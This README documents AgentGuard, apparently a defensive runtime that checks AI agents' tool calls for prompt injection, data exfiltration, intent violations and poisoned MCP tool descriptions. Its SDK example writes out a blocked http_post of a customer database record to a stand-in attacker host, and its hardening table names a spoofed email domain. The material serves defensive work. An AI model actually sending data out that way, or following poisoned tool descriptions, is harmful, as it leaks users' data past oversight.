# Aegotrax (runtime core)

Runtime protection for AI agents — checks tool calls before they run.

Public site: https://aegotrax.com

This repository contains the open pilot runtime (package name in code: `agentguard`).

---

# 🛡️ AgentGuard v0.2 — Pilot-Ready Runtime Security for AI Agents

Runtime protection for autonomous agents: **intercept tool calls**, evaluate **intent + data provenance**, and **block or require approval** before sensitive actions run.

Supports:
- **MCP Gateway** (stdio) for agent frameworks
- **Python SDK** for direct integration with your existing tools

---

## Install

```bash
pip install .
# with LangGraph demo deps:
pip install ".[demo]"
```

Commands after install:

```bash
agentguard-engine     # Risk Engine → http://127.0.0.1:8000
agentguard-gateway    # MCP Gateway (stdio)
```

Health check: `curl http://127.0.0.1:8000/health`

---

## Pilot integration (SDK — recommended)

```python
from agentguard import verify_tool_call, set_session_context, protected_tool

# 1) Register user intent for this session
set_session_context("sess-42", user_intent="Summarize the ticket only")

# 2) Before every tool call
result = verify_tool_call(
    session_id="sess-42",
    agent_id="support-agent",
    user_intent="Summarize the ticket only",
    tool="http_post",
    arguments={"url": "https://evil.example", "data": "customer_db_record"},
)

if result["decision"] == "BLOCK":
    raise PermissionError(result["reasons"])

# 3) Or decorate your real functions
@protected_tool(
    session_id_fn=lambda: "sess-42",
    agent_id_fn=lambda: "support-agent",
    user_intent_fn=lambda: "Summarize the ticket only",
)
def send_email(to: str, body: str):
    ...
```

---

## Configuration (environment)

| Variable | Default | Purpose |
|----------|---------|---------|
| `AGENTGUARD_API_KEY` | — | If set, required as `X-API-Key` on engine APIs |
| `AGENTGUARD_POLICY_PATH` | package policy | Custom `policy.yaml` |
| `AGENTGUARD_AUDIT_LOG` | `agentguard_audit.log` | Audit file path |
| `AGENTGUARD_MODE` | `simulate` | Gateway: `simulate` / `echo` / `forward` |
| `AGENTGUARD_FAIL_CLOSED` | `true` | Block when engine unreachable |
| `AGENTGUARD_APPROVAL_WEBHOOK` | — | POST events when `REQUIRE_APPROVAL` |
| `AGENTGUARD_HOST` / `PORT` | `127.0.0.1` / `8000` | Engine bind |

Policy override order: `AGENTGUARD_POLICY_PATH` → `./policy.yaml` → package default.

---

## Engine API (pilot)

| Method | Path | Description |
|--------|------|-------------|
| GET | `/health` | Liveness |
| POST | `/verify-multi-agent` | Main decision API |
| POST | `/session` | Set session intent |
| POST | `/session/reset` | Clear session provenance |
| GET | `/session/{id}` | Inspect session |
| POST | `/policy/reload` | Reload policy without restart |

---

## Threats covered

- Indirect prompt injection leading to tool abuse  
- Data provenance / multi-hop exfiltration  
- Intent constraint violations (“summarize only” → outbound)  
- Dangerous script execution  
- **Poisoned MCP tool descriptions** (schema pinning + drift detection)

---

## Schema pinning & drift detection (MCP)

A poisoned tool *description* can steer the agent before the tool-call interceptor
ever runs. AgentGuard pins tool schemas at registration and flags drift.

**Built-in gateway tools** are pinned automatically from canonical definitions at
startup. High-severity drift (description change, new/removed parameters, or an
unknown tool) is blocked *before* the call reaches the risk engine.

**When you proxy upstream MCP servers**, pin schemas once on connect, then check
every subsequent `tools/list`:

```python
from agentguard.mcp_gateway import pin_upstream_tool, check_upstream_drift

# After connecting to an upstream MCP server and receiving tools/list:
for tool in upstream_tools:
    pin_upstream_tool(tool["name"], tool)          # first time = trusted pin

# On later tools/list responses (or before offering the tool to the agent):
drift = check_upstream_drift(tool["name"], tool)
if drift and drift.severity == "high":
    # Do not expose this tool; log and alert
    ...
```

Introspection from the gateway itself:

```text
schema_status   # MCP tool → JSON of pinned schemas + recorded drift events
```

See `agentguard/schema_pinning.py` for the full API (`SchemaRegistry`, fingerprints, etc.).

---

## Security hardening (v0.2.3)

| Control | Default | Notes |
|---------|---------|-------|
| Server-side intent only | `AGENTGUARD_SERVER_INTENT_ONLY=true` | `/verify` ignores client `user_intent`; use `/session` |
| API key | optional | Set `AGENTGUARD_API_KEY` + `AGENTGUARD_REQUIRE_API_KEY=1` for shared hosts |
| Session TTL | 3600s | `AGENTGUARD_SESSION_TTL` (0 = never expire) |
| Rate limit | 120 / 60s per session | `AGENTGUARD_RATE_LIMIT` / `AGENTGUARD_RATE_WINDOW` |
| Audit redaction | on | `AGENTGUARD_AUDIT_REDACT` |
| URL allowlist | hostname parse | no substring `in` bypasses |
| SSRF/IMDS guard | on | blocks private/link-local/metadata in engine + gateway |
| Email domain | exact/subdomain | rejects `user@company.com.evil.com` |
| Intent patterns | broader | `only`, `just summarize`, `do not send`, … |
| Schema pinning | on | MCP tool definition drift |
| REQUIRE_APPROVAL | hard non-execute | tool never runs; approval is out-of-band |

Offline checks:

```bash
python examples/security_hardening_test.py
python examples/schema_pinning_demo.py
```

---

## Security notes (read before running)

This is a **local pilot / sandbox** runtime — not a production security control.

1. **Do not expose port 8000 to the internet.**  
   `docker-compose` binds **127.0.0.1:8000** only. Do not change this to `0.0.0.0` unless you set a strong `AGENTGUARD_API_KEY`.

2. **Default gateway mode is `simulate`** (no real outbound HTTP from the demo gateway).  
   `AGENTGUARD_MODE=forward` plus `AGENTGUARD_ALLOW_REAL_HTTP=1` enables **real** HTTP POST and must only be used in an isolated lab.

3. **Policy is heuristic** (keywords, allowlists, score thresholds). It will not catch every attack. Tune `policy.yaml` for your tools.

4. **Audit logs may contain tool arguments** (possibly sensitive). Redact before sharing logs in GitHub Issues or elsewhere.

5. Optional webhooks must be **public HTTPS** endpoints; loopback and private network targets are rejected.


## License

Apache-2.0
